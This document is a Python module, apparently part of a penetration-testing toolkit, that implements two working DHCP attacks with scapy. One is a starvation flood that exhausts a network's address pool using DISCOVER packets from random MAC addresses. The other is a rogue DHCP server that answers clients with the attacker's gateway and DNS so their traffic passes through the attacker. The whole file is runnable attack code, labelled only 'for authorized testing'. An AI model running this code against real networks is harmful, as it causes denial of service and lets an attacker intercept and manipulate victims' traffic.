"""DHCP attacks — starvation and rogue server.

- Starvation: flood DHCPDISCOVER from random MACs to exhaust the pool.
- Rogue server: answer DISCOVER/REQUEST with our OFFER/ACK, handing victims our
  gateway and DNS (so their traffic routes through us).

Packet building/parsing is testable; the flood and sniff-respond loops are
integration. For authorized testing only.
"""

from __future__ import annotations

import logging
import random
import threading
import time

log = logging.getLogger("reforge.dhcp")


def random_mac() -> str:
    return "02:" + ":".join(f"{random.randint(0, 255):02x}" for _ in range(5))


def build_discover(client_mac: str, xid: int | None = None):
    from scapy.layers.dhcp import BOOTP, DHCP
    from scapy.layers.inet import IP, UDP
    from scapy.layers.l2 import Ether
    from scapy.utils import mac2str

    xid = xid if xid is not None else random.randint(1, 0xFFFFFFFF)
    return (Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff")
            / IP(src="0.0.0.0", dst="255.255.255.255")
            / UDP(sport=68, dport=67)
            / BOOTP(chaddr=mac2str(client_mac), xid=xid, flags=0x8000)
            / DHCP(options=[("message-type", "discover"), "end"]))


def _reply(msg_type, client_mac, xid, offered_ip, server_ip,
           gateway=None, dns=None, netmask="255.255.255.0", lease=3600):
    from scapy.layers.dhcp import BOOTP, DHCP
    from scapy.layers.inet import IP, UDP
    from scapy.layers.l2 import Ether
    from scapy.utils import mac2str

    gateway = gateway or server_ip
    dns = dns or server_ip
    return (Ether(src="00:00:00:00:00:00", dst=client_mac)
            / IP(src=server_ip, dst="255.255.255.255")
            / UDP(sport=67, dport=68)
            / BOOTP(op=2, yiaddr=offered_ip, siaddr=server_ip,
                    chaddr=mac2str(client_mac), xid=xid)
            / DHCP(options=[("message-type", msg_type),
                            ("server_id", server_ip),
                            ("subnet_mask", netmask),
                            ("router", gateway),
                            ("name_server", dns),
                            ("lease_time", lease), "end"]))


def build_offer(client_mac, xid, offered_ip, server_ip, **kw):
    return _reply("offer", client_mac, xid, offered_ip, server_ip, **kw)


def build_ack(client_mac, xid, offered_ip, server_ip, **kw):
    return _reply("ack", client_mac, xid, offered_ip, server_ip, **kw)


def parse_request(pkt):
    """Return (client_mac, xid, message_type) from a DHCP packet, or None."""
    from scapy.layers.dhcp import BOOTP, DHCP
    from scapy.utils import str2mac

    if not pkt.haslayer(DHCP) or not pkt.haslayer(BOOTP):
        return None
    mtype = None
    for opt in pkt[DHCP].options:
        if isinstance(opt, tuple) and opt[0] == "message-type":
            mtype = {1: "discover", 3: "request"}.get(opt[1], opt[1])
    chaddr = pkt[BOOTP].chaddr[:6]
    return (str2mac(chaddr), int(pkt[BOOTP].xid), mtype)


class DhcpStarvation:  # pragma: no cover (needs root)
    def __init__(self, iface: str, rate: float = 0.02):
        self.iface = iface
        self.rate = rate
        self._t = None
        self._running = threading.Event()
        self.sent = 0

    def start(self):
        self._running.set()
        self._t = threading.Thread(target=self._loop, daemon=True); self._t.start()

    def _loop(self):
        from scapy.sendrecv import sendp

        while self._running.is_set():
            sendp(build_discover(random_mac()), iface=self.iface, verbose=False)
            self.sent += 1
            time.sleep(self.rate)

    def stop(self):
        self._running.clear()
        if self._t:
            self._t.join(timeout=2.0)


class RogueDhcp:  # pragma: no cover (needs root)
    def __init__(self, iface, server_ip, gateway=None, dns=None,
                 pool_base="192.168.66.", pool_start=100):
        self.iface = iface
        self.server_ip = server_ip
        self.gateway = gateway
        self.dns = dns
        self.pool_base = pool_base
        self._next = pool_start
        self._leases: dict[str, str] = {}   # mac -> offered ip (stable across DORA)
        self._sniffer = None
        self.discovers = 0   # DISCOVERs seen (clients looking for a server)
        self.offered = 0     # OFFERs we sent
        self.requests = 0    # REQUESTs seen (clients accepting)
        self.leased = 0      # ACKs we sent (leases completed)

    def _lease_for(self, mac: str) -> str:
        """The IP this client is offered/acked — one per MAC, so the OFFER and the
        subsequent REQUEST's ACK carry the same address (or the client rejects it)."""
        ip = self._leases.get(mac)
        if ip is None:
            ip = f"{self.pool_base}{self._next}"
            self._next += 1
            self._leases[mac] = ip
        return ip

    def _on(self, pkt):
        from scapy.sendrecv import sendp

        try:
            parsed = parse_request(pkt)
        except Exception:            # a malformed DHCP packet must never kill the loop
            return
        if not parsed:
            return
        mac, xid, mtype = parsed
        ip = self._lease_for(mac)
        if mtype == "discover":
            self.discovers += 1
            sendp(build_offer(mac, xid, ip, self.server_ip, gateway=self.gateway, dns=self.dns),
                  iface=self.iface, verbose=False)
            self.offered += 1
        elif mtype == "request":
            self.requests += 1
            sendp(build_ack(mac, xid, ip, self.server_ip, gateway=self.gateway, dns=self.dns),
                  iface=self.iface, verbose=False)
            self.leased += 1

    def status(self) -> dict:
        return {"running": self._sniffer is not None, "discovers": self.discovers,
                "offered": self.offered, "requests": self.requests, "leased": self.leased,
                "leases": dict(self._leases)}

    def start(self):
        from scapy.sendrecv import AsyncSniffer

        self._sniffer = AsyncSniffer(iface=self.iface, filter="udp and (port 67 or 68)",
                                     prn=self._on, store=False)
        self._sniffer.start()

    def stop(self):
        if self._sniffer:
            self._sniffer.stop(); self._sniffer = None
